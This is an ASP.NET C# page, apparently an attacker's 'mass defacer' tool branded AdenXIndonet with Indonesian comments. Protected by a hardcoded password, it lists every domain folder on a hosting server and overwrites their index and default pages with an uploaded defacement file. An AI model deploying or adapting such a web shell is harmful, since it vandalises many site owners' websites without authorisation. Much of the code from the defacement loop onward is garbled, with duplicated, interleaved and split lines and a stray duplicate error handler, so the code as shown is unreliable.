<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Collections.Generic" %>

<script runat="server">
    
    // MASS DEFACER TOOL - AdenXIndonet 🔥
    // Versi No Emoji (biar gak error encoding)
    
    protected void Page_Load(object sender, EventArgs e)
    {
        Response.ContentType = "text/html";
        
        string action = Request.QueryString["action"];
        string targetFile = Request.QueryString["file"];
        string pass = Request.QueryString["pass"];
        
        // Password proteksi (biar gak sembarang orang pake)
        if (pass != "AdenX2025")
        {
            ShowForm();
            return;
        }
        
        if (action == "deface" && Request.Files.Count > 0)
        {
            // Proses upload dan mass deface
            MassDeface();
        }
        else if (action == "list")
        {
            // List semua domain
            ListDomains();
        }
        else if (action == "restore" && !string.IsNullOrEmpty(targetFile))
        {
            // Restore file asli (kalo ada backup)
            RestoreFile(targetFile);
        }
        else
        {
            ShowForm();
        }
    }
    
    private void ShowForm()
    {
        Response.Write(@"
        <!DOCTYPE html>
        <html>
        <head>
            <title>AdenX Mass Defacer</title>
            <style>
                body{background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px;}
                .container{max-width:600px;margin:0 auto;border:1px solid #00ff00;padding:20px;}
                input,textarea,select{width:100%;margin:10px 0;background:#1a1a1a;color:#00ff00;border:1px solid #00ff00;padding:8px;}
                input[type=submit]{background:#00ff00;color:#000;cursor:pointer;font-weight:bold;}
                .info{color:#0ff;font-size:12px;}
                .title{text-align:center;color:#f0f;font-size:24px;margin-bottom:20px;}
            </style>
        </head>
        <body>
            <div class='container'>
                <div class='title'>MASS DEFACER TOOL</div>
                <div class='info'>Target: E:\New_Files\ (SEMUA DOMAIN)</div>
                <div class='info'>" + GetDomainCount() + @" domain ditemukan</div>
                
                <form method='post' enctype='multipart/form-data'>
                    <input type='hidden' name='action' value='deface'>
                    <input type='hidden' name='pass' value='AdenX2025'>
                    
                    <label>File HTML Deface:</label>
                    <input type='file' name='defaceFile' accept='.html,.htm' required>
                    
                    <label>Target filename (kosongin biar otomatis):</label>
                    <input type='text' name='targetName' placeholder='index.html / default.aspx / dll'>
                    
                    <label>Opsi:</label>
                    <select name='option'>
                        <option value='all'>Semua domain (full force)</option>
                        <option value='index'>Cuma ganti index.html</option>
                        <option value='default'>Cuma ganti default.aspx</option>
                        <option value='backup'>Backup dulu baru ganti</option>
                    </select>
                    
                    <input type='submit' value='MASS DEFACE NOW!'>
                </form>
                
                <br>
                <div class='info'><a href='?action=list&pass=AdenX2025' style='color:#0ff;'>List Semua Domain</a></div>
            </div>
        </body>
        </html>
        ");
    }
    
    private int GetDomainCount()
    {
        try
        {
            string basePath = @"E:\New_Files\";
            if (Directory.Exists(basePath))
            {
                return Directory.GetDirectories(basePath).Length;
            }
        }
        catch { }
        return 0;
    }
    
    private void ListDomains()
    {
        try
        {
            string basePath = @"E:\New_Files\";
            Response.Write("<pre style='background:#000;color:#0f0;padding:10px;'>");
            Response.Write("DAFTAR SEMUA DOMAIN:\n");
            Response.Write("========================\n\n");
            
            if (Directory.Exists(basePath))
            {
                string[] domains = Directory.GetDirectories(basePath);
                int i = 1;
                foreach (string domain in domains)
                {
                    string domainName = Path.GetFileName(domain);
                    Response.Write(i.ToString() + ". " + domainName + "\n");
                    i++;
                }
                Response.Write("\nTotal: " + domains.Length.ToString() + " domain\n");
            }
            else
            {
                Response.Write("Folder E:\\New_Files\\ tidak ditemukan!\n");
            }
            
            Response.Write("\n\n<a href='?pass=AdenX2025'>Kembali</a>");
            Response.Write("</pre>");
        }
        catch (Exception ex)
        {
            Response.Write("Error: " + ex.Message);
        }
    }
    
    private void MassDeface()
    {
        try
        {
            Response.ContentType = "text/html";
            Response.Write("<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'>");
            Response.Write("<h2 style='color:#f0f;'>MASS DEFACE EXECUTION</h2>");
            Response.Write("<pre>");
            
            HttpPostedFile file = Request.Files[0];
            string targetName = Request.Form["targetName"];
            string option = Request.Form["option"] ?? "all";
            
            if (file == null || file.ContentLength == 0)
            {
                Response.Write("ERROR: File kosong!\n");
                Response.Write("</pre><a href='?pass=AdenX2025'>Kembali</a></body></html>");
                return;
            }
            
            // Baca file HTML
            byte[] fileData = new byte[file.ContentLength];
            file.InputStream.Read(fileData, 0, file.ContentLength);
            
            // Tentukan nama target
            if (string.IsNullOrEmpty(targetName))
            {
                targetName = Path.GetFileName(file.FileName);
                if (string.IsNullOrEmpty(targetName))
                    targetName = "index.html";
            }
            
            string basePath = @"E:\New_Files\";
            
            if (!Directory.Exists(basePath))
            {
                Response.Write("ERROR: Folder E:\\New_Files\\ tidak ditemukan!\n");
                Response.Write("</pre><a href='?pass=AdenX2025'>Kembali</a></body></html>");
                return;
            }
            
            // Dapatkan semua folder domain
            string[] domains = Directory.GetDirectories(basePath);
            Response.Write("Target: " + domains.Length.ToString() + " domain\n");
            Response.Write("File: " + targetName + "\n");
            Response.Write("Opsi: " + option + "\n");
            Response.Write("========================\n\n");
            
");
            
            int            int success = success = 0 0;
            int failed = ;
            int failed = 0;
0;
            
                       
            foreach ( foreach (string domainstring domain in domains)
            in domains)
            {
                string domain {
                string domainName = Path.GetName = Path.GetFileName(FileName(domain);
domain);
                
                               
                try
 try
                {
                {
                    Response                    Response.Write(">>> " + domainName.Write(">>> " + domainName + "... + "... ");
                    
 ");
                    
                    //                    // Tentukan Tentukan file yang file yang akan ditimpa berdasarkan o akan ditimpa berdasarkan opsi
psi
                    string                    string[] target[] targetFiles =Files = GetTarget GetTargetFiles(Files(domain,domain, targetName, option targetName, option);
                    
);
                    
                    foreach                    foreach (string (string targetFile in targetFiles)
 targetFile in target                    {
Files)
                        //                    {
                        // Backup kalo o Backup kalo opsi backuppsi backup
                       
                        if ( if (option ==option == "back "backup" && Fileup" && File.Exists.Exists(targetFile(targetFile))
                       ))
                        {
                            {
                            string backup string backupFile =File = targetFile targetFile + ". + ".backupbackup_" +_" + DateTime.Now DateTime.Now.Ticks.Ticks.ToString();
                            File.ToString();
                            File.Copy.Copy(targetFile(targetFile, backup, backupFile);
File);
                            Response                            Response.Write.Write("[BACK("[BACKUP]UP] ");
                        }
                        
                        // ");
                        }
                        
                        // Tulis Tulis file deface
 file deface
                        File                        File.WriteAll.WriteAllBytes(targetBytes(targetFile,File, fileData);
                        fileData);
                        Response.Write Response.Write("OK("OK " + Path.GetFileName(target " + Path.GetFileName(targetFile)File) + + " ");
                    }
                    
 " ");
                                       Response }
                    
.Write(" BER                    Response.Write(" BERHASHASIL\nIL\n");
                   ");
                    success++;
 success++;
                }
                }
                catch                catch (Exception ex)
 (Exception ex)
                {
                {
                    string                    string errMsg errMsg = ex = ex.Message;
.Message;
                    if                    if (err (errMsgMsg.Length.Length >  > 30)30) errMsg = err errMsg = errMsg.SubMsg.Substring(string(0,0, 30) + 30 "...";
) + "...";
                    Response                    Response.Write(" GAG.Write(" GAGAL ("AL (" + err + errMsg +Msg + ")\n");
 ")\n");
                    failed                    failed++;
               ++;
                }
            }
            }
            
            Response.Write("\ }
            
            Response.Write("\n========================n========================\n\n");
           ");
            Response.Write Response.Write("BER("BERHASHASIL:IL: " + success.ToString " + success.ToString() + " domain\n");
() + " domain\n");
            Response            Response.Write(".Write("GAGGAGAL:AL: " + " + failed.ToString failed.ToString() +() + " " domain domain\n");
\n");
            
            Response            
           .Write("\ Response.Write("\nMnMASS DEFASS DEFACE COMPLACE COMPLETEETE!\n!\n");
           ");
            Response.Write("</pre> Response.Write("</pre");
           >");
            Response.Write Response.Write("<br><("<br><aa href=' href='?pass?pass=AdenX202=AdenX2025'5' style=' style='color:#0fcolor:#0f0;0;'>K'>Kembaliembali ke menu ke menu</a</a>");
>");
            Response            Response.Write("</body.Write("</body></html>");
        }
        catch (Exception ex)
        {
            Response.Write("FATAL ERROR: " + ex.Message + "\n");
            Response.Write("</pre></html>");
        }
        catch (Exception ex)
        {
            Response.Write("><aFATAL ERROR: " + ex.Message + "\n");
            Response.Write("</pre><a href=' href='?pass?pass=Aden=AdenX202X2025'>5'>KembKembali</a></ali</a></body></body></html>html>");
       ");
        }
    }
    
 }
    }
    
    private    private string[] string[] GetTarget GetTargetFiles(stringFiles(string domainPath domainPath, string, string defaultName defaultName, string, string option)
    {
 option)
    {
        List        List<string><string> files = files = new List new List<string>();
<string>();
        
               
        switch ( switch (option)
option)
        {
        {
            case            case "index":
                "index":
                files.Add files.Add(Path(Path.Combine.Combine(domain(domainPath,Path, "index.html"));
 "index                files.html"));
                files.Add(.Add(Path.Path.Combine(Combine(domainPathdomainPath, "index.htm"));
                break;
                
, "index.htm"));
                break;
                
            case "            case "default":
default":
                files                files.Add(.Add(Path.Combine(Path.Combine(domainPathdomainPath, ", "default.aspxdefault.aspx"));
               "));
                files.Add files.Add(Path(Path.Combine.Combine(domain(domainPath, "DefaultPath,.aspx"));
 "Default.aspx"));
                files                files.Add(.Add(Path.Path.Combine(domainPathCombine(domainPath, "default.asp, "default.asp"));
                break;
"));
                break;
                
                           
            case " case "all":
all":
            default            default:
                // C:
                // Cari semuaari semua kemungkin kemungkinan filean file index
 index
                string[] possible                string[] possibleFiles =Files = {
                    {
                    "index "index.html",.html", "index "index.htm", "default.htm", "default.aspx",.aspx", "Default "Default.aspx",
.aspx",
                    "                    "default.aspdefault.asp", "", "index.phpindex.php", "", "home.htmlhome.html", "main.aspx", "main.aspx",
                   ",
                    defaultName defaultName
                };
                

                };
                
                //                // Pake Pake loop manual
                List<string> loop manual
                List<string> distinctFiles = new distinctFiles = new List<string List<string>();
               >();
                foreach (string f foreach (string f in possibleFiles)
 in possibleFiles)
                {
                {
                    if (!string                    if (!string.IsNullOrEmpty.IsNullOrEmpty(f) && !(f) && !distinctdistinctFiles.ContainsFiles.Contains(f))
                    {
(f))
                    {
                        distinctFiles.Add                        distinctFiles.Add(f);
                    }
(f);
                    }
                }
                }
                
                               
                foreach (string file foreach (string file in distinctFiles)
 in distinctFiles)
                {
                    files                {
                    files.Add(.Add(Path.Path.Combine(domainPathCombine(domainPath, file, file));
               ));
                }
                break;
 }
                break;
        }
        }
        
               
        return files.ToArray return files.ToArray();
   ();
    }
    
 }
    
    private    private void Rest void RestoreFile(string fileoreFile(string filePath)
    {
        tryPath)
    {
        try
       
        {
            {
            string dir = Path string dir = Path.GetDirectory.GetDirectoryName(fileName(filePath);
            stringPath);
            string fileName = fileName = Path.Get Path.GetFileName(fileFileName(filePath);
Path);
            string            string pattern = pattern = fileName + fileName + ".back ".backup_up_*";
            
           *";
            
            string[] string[] backups = backups = Directory.GetFiles(dir, pattern Directory.GetFiles(dir, pattern);
            
);
            
            if            if (backups.Length (backups.Length >  > 0)
0)
            {
            {
                File.Copy(backups[0],                File.Copy(backups[0], filePath file, true);
Path, true);
                Response.Write                Response.Write("Rest("Restored:ored: " + " + Path.Get Path.GetFileName(fileFileName(filePath)Path) + " + " from from backup\n");
            }
 backup\n");
            }
            else            else
           
            {
                {
                Response.Write("No Response.Write("No backup found backup found\n");
\n");
            }
            }
        }
        }
        catch (Exception        catch (Exception ex)
 ex)
        {
        {
            Response            Response.Write(".Write("RestoreRestore error: " + ex.Message error: " + ex.Message + "\ + "\n");
n");
        }
    }
        }
    }
    
</    
</script>
script>